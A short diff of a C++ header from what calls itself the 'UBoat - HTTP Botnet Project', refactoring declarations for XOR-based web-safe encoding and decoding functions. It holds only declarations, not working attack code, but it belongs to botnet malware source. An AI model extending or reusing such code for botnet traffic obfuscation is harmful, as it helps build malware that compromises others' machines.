@@ -1,12 +1,15 @@
-#ifndef WEBSAFEENCRYPTION_H
-#define WEBSAFEENCRYPTION_H
+/**
+ * This file is part of UBoat - HTTP Botnet Project
+ */
+
+#ifndef __UBOAT_WEBSAFEENCRYPTION_H
+#define __UBOAT_WEBSAFEENCRYPTION_H
+
+#include <string>
 
 #include "xor.h"
 
-char* GetEncodedXorResult(char* input, char* key, int inputLength, int keyLength, char** outputKey);
-char* GetDecodedXorResult(char* input, char* key, int* outputLength);
-void FreeEncodedXorResult(char* input, char* key);
-void FreeDecodedXorResult(char* input);
+XorResult GetEncodedXorResult(const std::string& input, const std::string& key);
+std::string GetDecodedXorResult(const std::string& input, const std::string& key);
 
-
-#endif
+#endif // __UBOAT_WEBSAFEENCRYPTION_H
